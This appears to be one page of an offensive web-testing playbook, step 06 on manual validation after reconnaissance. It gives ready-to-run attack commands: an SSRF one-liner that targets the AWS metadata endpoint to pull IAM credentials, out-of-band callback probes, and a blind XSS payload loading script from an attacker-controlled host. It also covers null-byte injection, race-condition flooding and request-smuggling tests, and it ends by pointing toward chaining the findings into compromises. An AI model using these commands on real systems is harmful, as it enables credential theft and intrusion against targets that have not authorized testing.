# 06 — Manual Validation & Auditing

## Operational Goal
Test the identified attack surface against specific Architectural Failure hypotheses. Move beyond automated scanning into targeted mechanism abuse.

## Execution Flow (The "Fast Pipe")

### 1. SSRF & Internal Routing
Target parameters identified by `gf ssrf`. Test for cloud metadata and internal port reachability.
```bash
cat recon/params/ssrf.txt | qsreplace 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' | httpx -silent -match-string 'AccessKeyId'
cat recon/params/ssrf.txt | qsreplace 'http://YOUR_INTERACTSH_URL' | httpx -silent
```

### 2. XSS & Transformation Abuse
Test inputs for character expansion and WAF bypasses using DOM sinks and blind payloads.
```bash
cat recon/params/xss.txt | dalfox pipe --silence
```
*Blind:* Inject `"><script src=https://YOUR_BXSS></script>` into `User-Agent`, `Referer`, and profile fields.

### 3. Parser & Logic Validation
*   **Delimiter Smuggling:** Inject `\0`, `\n`, or `%00` into API parameters.
*   **Race Conditions:** Hit state-changing endpoints (e.g., `/checkout`, `/apply-promo`) with 50+ concurrent requests using Turbo Intruder to test for [Deduplication Race Conditions](../skills/state_management/race_conditions.md).

## Reasoning Checkpoint
*   **Verify Distributed Consistency:** If a state change succeeds, how long before it propagates? Test for [Stale Authorization Windows](../skills/state_management/consistency_failures.md).
*   **Verify Protocol Desynchronization:** Send conflicting `Content-Length` and `Transfer-Encoding` headers to identify [Proxy/Backend Interpretation Gaps](../skills/infrastructure/parser_differential_abuse.md).

## Transition to Chain Building
Move to **[07 — Chain Building](07_chain_building.md)** to combine these verified leaks into high-impact compromises.